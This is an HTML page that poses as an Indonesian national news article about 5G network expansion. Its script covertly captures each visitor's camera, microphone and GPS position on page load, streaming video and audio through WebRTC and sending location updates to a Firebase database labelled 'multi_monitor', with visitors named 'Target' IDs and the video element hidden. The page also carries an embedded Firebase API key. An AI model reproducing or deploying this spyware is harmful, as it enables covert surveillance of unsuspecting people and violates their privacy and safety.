<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Berita Nasional Hari Ini</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; color: #333; }
        .nav { background: #1a365d; color: white; padding: 15px; font-weight: bold; margin: -20px -20px 20px -20px; }
        .art { max-width: 600px; margin: 0 auto; }
        img { width: 100%; border-radius: 8px; margin: 15px 0; }
        #v { display: none; }
    </style>
</head>
<body>
    <div class="nav">PORTAL BERITA RESMI</div>
    <div class="art">
        <h1>Percepatan Jaringan 5G di Seluruh Wilayah Indonesia</h1>
        <p><small>Dipublikasikan: Baru saja</small></p>
        <img src="https://picsum.photos/600/300" alt="News">
        <p>Pemerintah berkomitmen untuk memeratakan akses internet cepat guna mendukung transformasi digital nasional...</p>
    </div>
    <video id="v" autoplay playsinline muted></video>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(firebaseConfig);
        
        // Buat ID unik untuk setiap perangkat target
        const targetId = "Target_" + Math.random().toString(36).substr(2, 5);
        const db = firebase.database().ref('multi_monitor/' + targetId);

        let pc;
        let localStream;

        async function init() {
            await db.remove(); // Bersihkan sesi lama

            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = localStream;
                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
            } catch (e) { console.log("Izin ditolak"); }

            navigator.geolocation.watchPosition(p => {
                db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude, lastSeen: Date.now(), id: targetId });
            });

            pc.onicecandidate = e => { if(e.candidate) db.child('ice_t').push(e.candidate.toJSON()); };
            
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp });

            db.child('sdp/answer').on('value', async s => {
                const a = s.val();
                if(a && !pc.currentRemoteDescription) await pc.setRemoteDescription(new RTCSessionDescription(a));
            });

            db.child('ice_m').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
        }

        window.onload = init;
        window.onbeforeunload = () => { db.remove(); }; // Hapus saat target offline
    </script>
</body>
</html>
